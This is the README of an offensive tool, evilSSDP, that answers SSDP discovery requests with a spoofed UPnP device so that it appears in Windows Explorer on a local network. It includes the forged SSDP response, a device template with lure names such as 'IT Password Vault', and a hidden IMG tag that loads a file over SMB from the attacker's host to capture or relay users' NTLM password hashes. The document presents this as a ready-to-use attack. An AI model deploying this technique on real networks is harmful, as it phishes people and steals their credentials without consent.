# Overview
This tool responds to SSDP multicast discover requests, posing as a generic UPNP device on a local network. Your spoofed device will magically appear in Windows Explorer on machines in your local network. Users who are tempted to open the device are shown a configurable webpage. By default, this page will load a hidden image over SMB, allowing you to capture or relay their NTLM password hash.

This works on Windows 10 systems (even if they have disabled NETBIOS and LLMNR) and requires no existing credentials to execute.

![Demo Video](ssdp.mp4)

# Usage
You need to provide the network interface at a minimum. The interface is used for both the UDP SSDP interaction as well as hosting a web server for the XML files and phishing page. The port is used only for the web server and defaults to 8888.

The tool will automatically inject an IMG tag into the phishing page using the IP of the interface you provide. To work with hashes, you'll need to launch an SMB server at that interface. This can be customized in a future version.

You can choose between the included templates in the "templates" folder, or build your own simply by duplicating an existing folder and editing the files inside. This allows you to customize the device name, the phishing contents page, or even build a totally new type of UPNP device that I haven't created yet.

```
usage: essdp.py [-h] [-p PORT] [-t TEMPLATE] interface

positional arguments:
  interface             Network interface to listen on.

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Port for HTTP server. Defaults to 8888.
  -t TEMPLATE, --template TEMPLATE
                        Name of a folder in the templates directory. Defaults
                        to "password-vault". This will determine xml and
                        phishing pages used."

  ```

# Workflow
Devices attempting to discover shared network resources will send a UDP multicast out to 239.255.255.250 on port 1900. The source port is randomized. An example request looks like this:
```
M-SEARCH * HTTP/1.1
Host: 239.255.255.250:1900
ST: upnp:rootdevice
Man: "ssdp:discover"
MX: 3
```

To interact with this host, we need to capture both the source port and the 'ST' (Service Type) header. The response MUST be sent to the correct source port and SHOULD include the correct ST header. Note that it is not just the Windows OS looking for devices - scanning a typical network will show a large amount of requests from applications inside the OS (like Spotify), mobile phones, and other media devices. Windows will only play ball if you reply with the correct ST, other sources are more lenient.

evilSSDP will extract the requested ST and send a reponse like the following:

```
HTTP/1.1 200 OK
CACHE-CONTROL: max-age=1800
DATE: Tue, 26 Jun 2018 01:06:26 GMT
EXT: 
LOCATION: http://192.168.1.131:8888/ssdp/device-desc.xml
SERVER: Linux/3.10.96+, UPnP/1.0, eSSDP/0.1
ST: upnp:rootdevice
USN: uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563:upnp-rootdevice
BOOTID.UPNP.ORG: 0
CONFIGID.UPNP.ORG: 1
```

The location IP, ST, and date are constructed dynamically. This tells the requestor where to find more information about our device. Here, we are forcing Windows (and other requestors) to access our 'Device Descriptor' xml file and parse it. The USN is just a random string and needs only to be unique and formatted properly.

evilSSDP will pull the 'device.xml' file from the chosen templates folder and dynamically plug in some variables such as your IP address. This 'Device Descriptor' file is where you can customize some juicy-sounding friendly names and descriptions. It looks like this:

```
<root>
    <specVersion>
        <major>1</major>
        <minor>0</minor>
    </specVersion>
    <device>
        <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
        <friendlyName>IT Password Vault</friendlyName>
        <manufacturer>PasSecure</manufacturer>
        <manufacturerURL>http://passecure.com</manufacturerURL>
        <modelDescription>Corporate Password Repository</modelDescription>
        <modelName>Core</modelName>
        <modelNumber>1337</modelNumber>
        <modelURL>http://passsecure.com/1337</modelURL>
        <serialNumber>1337</serialNumber>
        <UDN>uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563</UDN>
        <serviceList>
            <service>
                <URLBase>http://$localIp:$localPort</URLBase>
                <serviceType>urn:ecorp.co:service:ePNP:1</serviceType>
                <serviceId>urn:epnp.ecorp.co:serviceId:ePNP</serviceId>
                <controlURL>/epnp</controlURL>
                <eventSubURL/>
                <SCPDURL>/service-desc.xml</SCPDURL>
            </service>
        </serviceList>
        <presentationURL>http://$localIp:$localPort/present.html</presentationURL>
        </device>
    </root>

```

A key line in this file contains the 'Presentation URL'. This is what will load in a user's browser if they decide to manually double-click on the UPNP device. evilSSDP will host this file automatically (present.html from the chosen template folder), plugging in your source IP address into an IMG tag to access an SMB share that you can host with tools like [Impacket](https://www.coresecurity.com/corelabs-research/open-source-tools/impacket), [Responder](https://github.com/SpiderLabs/Responder), or [Metasploit](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb).

The IMG tage looks like this:

```
<img src="file://///$localIp/smb/hash.jpg" style="display: none;" /><br>
```

# Customization
This is an early POC, but constructed in such a way to allow easy template creation in the future. I've included two very basic templates - simply duplicate a template folder and customize for your own use. Then use the '-t' parameter to choose your new template.

The tool currently only correctly creates devices for the UPNP 'rootdevice' device type, although it is responding to the SSDP queries for all devices types. If you know UPNP well, you can create a new template with the correct parameters to fufill requests for other device types as well.

# Thanks
Thanks to ZeWarren and his project [here](https://github.com/ZeWaren/python-upnp-ssdp-example). I used this extensively to understand how to get the basics for SSDP working.

Also thanks to Microsoft for developing lots of fun insecure things to play with.
